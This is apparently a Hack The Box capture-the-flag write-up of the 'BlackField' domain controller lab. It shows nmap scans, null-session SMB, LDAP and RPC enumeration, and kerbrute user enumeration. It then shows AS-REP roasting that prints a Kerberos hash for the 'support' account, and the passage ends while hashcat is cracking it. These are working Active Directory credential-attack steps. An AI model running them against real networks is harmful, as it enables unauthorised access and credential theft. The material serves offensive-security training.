# BlackField

Nmap Scan:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.192
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 10:13 EDT
Nmap scan report for 10.10.10.192
Host is up (0.13s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-24 21:14:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-24T21:14:16
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.51 seconds
                                                                                                                                                                                                                                                            
```

Nmap All port scan:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ nmap -p- --min-rate 10000 -oA nmap/allports 10.10.10.192 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 10:21 EDT
Nmap scan report for 10.10.10.192
Host is up (0.13s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds

```

Nmap All ports detailed scan:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ sudo nmap -sC -sV -O -p 53,88,135,389,445,593,3268,5985 10.10.10.192 -oA nmap/allports-detailed 10.10.10.192
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 10:23 EDT
Nmap scan report for 10.10.10.192
Host is up (0.13s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-24 21:23:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2024-04-24T21:23:58
|_  start_date: N/A

Nmap scan report for 10.10.10.192
Host is up (0.13s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-24 21:24:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-24T21:25:02
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Post-scan script results:
| clock-skew: 
|   6h59m59s: 
|     10.10.10.192
|_    10.10.10.192
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 120.99 seconds

```

Rust Scan:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ rustscan -a 10.10.10.192 --range 1-65535 -- -A -sC -Pn 
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.192:53
Open 10.10.10.192:88
Open 10.10.10.192:135
Open 10.10.10.192:445
Open 10.10.10.192:389
Open 10.10.10.192:593
Open 10.10.10.192:3268
Open 10.10.10.192:5985
[~] Starting Nmap
[>] The Nmap command to be run is nmap -A -sC -Pn -vvv -p 53,88,135,445,389,593,3268,5985 10.10.10.192

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 10:25 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:25
Completed NSE at 10:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:25
Completed NSE at 10:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:25
Completed NSE at 10:25, 0.01s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:25
Completed Parallel DNS resolution of 1 host. at 10:25, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:25

```

**Summarizing the scan results**

- Port `53` is open and is hosting a `DNS` service over TCP.
- Port `88` is open and is hosting the `kerberos` service.
- Ports `135` / `445` are open and are hosting the `RPC` / `SMB` share services respectively.
- Ports `389` / `3268` are open and are hosting the `LDAP` service.
- Ports `593` is open and hosting `RPC` services over `HTTP`.
- Port `5985` is hosting the `WinRM` service, which will be good if credentials are found.

Enumerating `SMB` service using `crackmapexec`:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ crackmapexec smb 10.10.10.192            
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ crackmapexec smb 10.10.10.192 -u '' -p ''                                       
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\:                                                                                                                                                                                                                                                         

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ crackmapexec smb 10.10.10.192 -u '' -p '' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\: 
SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ crackmapexec smb 10.10.10.192 -u 'fak3r' -p 'fak3r'         
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\fak3r:fak3r 
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ crackmapexec smb 10.10.10.192 -u '' -p 'fak3r'          
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\:fak3r 

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ crackmapexec smb 10.10.10.192 -u 'fak3r' -p 'fak3r' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\fak3r:fak3r 
SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ crackmapexec smb 10.10.10.192 -u '' -p 'fak3r' --shares 
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\:fak3r 
SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
                                                                                                                                                                                                                                                           
```

`crackmapexec` gives a hostname, `DC01`, which is in line with the thinking that this was a domain controller. It also gives a domain, `BLACKFIELD.local`.

Using `smbmap`:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ smbmap -H 10.10.10.192 -u null

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.192:445        Name: 10.10.10.192              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

With no creds, I can read the `profiles$` & `forensic` share.

Now, I’ll try listing the contents of the `profile$` share using `smbclient`:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ smbclient -N //10.10.10.192/profiles$
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020

...SNIP...

  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                5102079 blocks of size 4096. 1692372 blocks available

```

There are ton of directories inside the `profiles$` share and each one of them are empty.

On the `forensic` share, I was not able to do anything:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ smbclient -N //10.10.10.192/forensic 
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> recurse on
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \*
```

I’ll leave this behind and move on to enumerating `LDAP`.

Enumerating `LDAP` service using `ldapsearch`:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ ldapsearch -H ldap://10.10.10.192 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=BLACKFIELD,DC=local
namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
                                                                                                                                                                                                                                                            
```

`DomainDnsZones.blackfield.local` and `ForestDnsZones.blackfield.local` seem like interesting subdomains. Interestingly, they both resolve over `dig` as well (only one shown):

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ dig @10.10.10.192 ForestDnsZones.BLACKFIELD.local

; <<>> DiG 9.19.21-1-Debian <<>> @10.10.10.192 ForestDnsZones.BLACKFIELD.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14785
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;ForestDnsZones.BLACKFIELD.local. IN    A

;; ANSWER SECTION:
ForestDnsZones.BLACKFIELD.local. 600 IN A       10.10.10.192

;; Query time: 131 msec
;; SERVER: 10.10.10.192#53(10.10.10.192) (UDP)
;; WHEN: Wed Apr 24 10:46:53 EDT 2024
;; MSG SIZE  rcvd: 76

```

Unfortunately , I can’t get `LDAP` to give me any more information:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ ldapsearch -H ldap://10.10.10.192 -x -b "DC=BLACKFIELD,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=BLACKFIELD,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

Enumerating `RPC` using `rpcclient`:

```bash
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ rpcclient 10.10.10.192                                
Password for [WORKGROUP\darshan]:
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 8C 1A 31 91 BE 70 E2 A1   1A 35 F0 93 E5 46 F6 F3   ..1..p.. .5...F..
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ rpcclient 10.10.10.192 -U ''
Password for [WORKGROUP\]:
rpcclient $> srvinfo
        10.10.10.192   Wk Sv PDC Tim NT     
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> exit

```

I was able to access the `RPC` service using NULL authentication, however, my access was limited to a few commands and I wasnt able to enumerate the service.

Now that I was able to get NULL access to `SMB` and `RPC`, I’ll run `enum4linux` to help me in the enumeration process:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ enum4linux 10.10.10.192 -a

Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Apr 24 10:56:16 2024

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                                            
Target ........... 10.10.10.192                                                                                                                                                                                                                             
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================( Enumerating Workgroup/Domain on 10.10.10.192 )============================
                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                            
[E] Can't find workgroup/domain                                                                                                                                                                                                                             

 ================================( Nbtstat Information for 10.10.10.192 )================================
                                                                                                                                                                                                                                                            
Looking up status of 10.10.10.192                                                                                                                                                                                                                           
No reply from 10.10.10.192

 ===================================( Session Check on 10.10.10.192 )===================================
                                                                                                                                                                                                                                                            
[+] Server 10.10.10.192 allows sessions using username '', password ''                                                                                                                                                                                      
                                                                                                                                                                                                                                                            
 ================================( Getting domain SID for 10.10.10.192 )================================
                                                                                                                                                                                                                                                            
Domain Name: BLACKFIELD                                                                                                                                                                                                                                     
Domain Sid: S-1-5-21-4194615774-2175524697-3563712290

[+] Host is part of a domain (not a workgroup)                                                                                                                                                                                                              
                                                                                                                                                                                                                                                            
 ===================================( OS information on 10.10.10.192 )===================================
                                                                                                                                                                                                                                                            
[E] Can't get OS info with smbclient                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                            
[+] Got OS info for 10.10.10.192 from srvinfo:                                                                                                                                                                                                              
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                                      

 =======================================( Users on 10.10.10.192 )=======================================
                                                                                                                                                                                                                                                            
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                                                                                                                                                                                                                                                                                                                                                                                    

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                                                                                                                         
                                                                                                                                                                                                                                                            
 =================================( Share Enumeration on 10.10.10.192 )=================================
                                                                                                                                                                                                                                                            
do_connect: Connection to 10.10.10.192 failed (Error NT_STATUS_IO_TIMEOUT)                                                                                                                                                                                  

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.192                                                                                                                                                                                                                
                                                                                                                                                                                                                                                            
 ============================( Password Policy Information for 10.10.10.192 )============================
                                                                                                                                                                                                                                                            
[E] Unexpected error from polenum:                                                                                                                                                                                                                          

[+] Attaching to 10.10.10.192 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: [Errno Connection error (10.10.10.192:139)] timed out

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

[E] Failed to get password policy with rpcclient                                                                                                                                                                                                            

 =======================================( Groups on 10.10.10.192 )=======================================
                                                                                                                                                                                                                                                            
[+] Getting builtin groups:                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                            
[+]  Getting builtin group memberships:                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                            
[+]  Getting local groups:                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                            
[+]  Getting local group memberships:                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                            
[+]  Getting domain groups:                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                            
[+]  Getting domain group memberships:                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                            
 ==================( Users on 10.10.10.192 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                                                                                                            
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                                                                                                                                                   
                                                                                                                                                                                                                                                            
 ===============================( Getting printer info for 10.10.10.192 )===============================
                                                                                                                                                                                                                                                            
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                                     

enum4linux complete on Wed Apr 24 10:57:48 2024

```

So, now that I have done everything there might be to enumerate, I’ll go back to the tons of empty directories inside the `profiles$` share which seem to be a bunch of usernames. I can create a userlist using the name of these directories.

I’ll mount the share on my local box (just hitting enter when prompted for a password):

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ sudo mount -t cifs '//10.10.10.192/profiles$' /mnt         
[sudo] password for darshan: 
Password for root@//10.10.10.192/profiles$: 

```

I’ll save these usernames to a file:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ cd /mnt                  
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[/mnt]
└─$ ls > /home/kali/Desktop/HackTheBox/Windows-boxes/blackfield/user.lst

```

Alright, now that I have a list of potential `usernames`, I’ll run `kerbrute` to identify if any of these users are valid users:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ /opt/kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d blackfield.local -o kerbrute-username.out user.lst

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/27/24 - Ronnie Flathers @ropnop

2024/04/27 03:30:04 >  Using KDC(s):
2024/04/27 03:30:04 >   10.10.10.192:88

2024/04/27 03:30:25 >  [+] VALID USERNAME:       audit2020@blackfield.local
2024/04/27 03:32:22 >  [+] VALID USERNAME:       support@blackfield.local
2024/04/27 03:32:27 >  [+] VALID USERNAME:       svc_backup@blackfield.local
2024/04/27 03:32:53 >  Done! Tested 314 usernames (3 valid) in 169.326 seconds
```

Now that I have the valid usernames, I’ll seperate these valid usernames using the following commands:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ cat kerbrute-username.out | awk '{print $7}'

audit2020@blackfield.local
support@blackfield.local
svc_backup@blackfield.local
usernames
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ grep VALID kerbrute-username.out | awk '{print $7}'
audit2020@blackfield.local
support@blackfield.local
svc_backup@blackfield.local

```

Now that I dont want the `@blacfield.local`, I’ll use another `awk` command to print just the username:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ grep VALID kerbrute-username.out | awk '{print $7}' | awk -F\@ '{print $1}'
audit2020
support
svc_backup
```

I’ll then pipe these usernames to a file:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ grep VALID kerbrute-username.out | awk '{print $7}' | awk -F\@ '{print $1}' > kerbrute-username.txt 
```

I’ll also output one more format as the `domain username` using the following command:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ grep VALID kerbrute-username.out | awk '{print $7}' | awk -F\@ '{print $2"\\"$1}' > kerbrute-domain-username.txt
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ cat kerbrute-domain-username.txt
blackfield.local\audit2020
blackfield.local\support
blackfield.local\svc_backup
```

Now that I have the usernames and the domain users, Ill do a `Kerberos pre-authentication` check to find out if any user has the `Kerberos Pre Authentication check disabled` using Impacket’s `GetNPUsers`:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile kerbrute-username.txt blackfield/ 
/usr/local/bin/GetNPUsers.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240304.182237.3ee3bb46', 'GetNPUsers.py')
Impacket v0.12.0.dev1+20240304.182237.3ee3bb46 - Copyright 2023 Fortra

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD:61bf10686930a2b0aca50bcffac8b69d$c43ad62686e2e8db97077af8263fae871825d8dd7a543647339ed165292afe82f396ed97f1caf631418041657c475d47bb1c2f302f2162519ff0a2cb7468e8753a04484e03d4ffa03fb223bfd58b46e892d4e5eceab7fb65a9792c1adc9a2c8c6e0f596f768a8d249a7bcd3fcaa87c754937e66366d928d4aaa7d0475933981a6803fddecff0ecd4a0dc1b3a3efa2d369430e61908d0ad6b5388ceb966e1f8632f6247c96ed22fdb89ca0ed75f2a99496539638571e1915fdfd214a482b9b20bbd62319891aea6ea747d29cc4b206fc97d5b9b2895ab2f8569dad6385f7d56db0998399f6154bf2235b0c0b21082
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

And the user `support` has the `pre authentication` check disabled.

Ill copy this `krb5` hash to a file and quickly try to crack the hash with `hashcat`:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ gedit support-hash.txt

(gedit:30738): tepl-WARNING **: 04:32:51.104: Style scheme 'Kali-Dark' cannot be found, falling back to 'Kali-Dark' default style scheme.

(gedit:30738): tepl-WARNING **: 04:32:51.104: Default style scheme 'Kali-Dark' cannot be found, check your installation.

(gedit:30738): Gtk-WARNING **: 04:32:54.539: Calling org.xfce.Session.Manager.Inhibit failed: GDBus.Error:org.freedesktop.DBus.Error.UnknownMethod: No such method “Inhibit”
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ hashcat -m 18200 support-hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 4800HS with Radeon Graphics, 1439/2943 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

